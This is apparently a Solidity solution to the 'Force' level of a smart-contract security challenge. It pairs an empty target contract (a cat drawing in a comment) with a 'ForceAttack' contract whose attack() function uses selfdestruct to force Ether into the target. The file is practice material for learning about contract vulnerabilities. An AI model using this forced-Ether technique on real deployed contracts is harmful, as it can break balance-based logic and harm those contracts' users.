// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}


contract ForceAttack {
    // Payable constructor to fund this contract with Ether
    constructor() payable {}

    // Function to self-destruct and send Ether to the target address
    function attack(address payable _target) public {
        selfdestruct(_target);
    }
}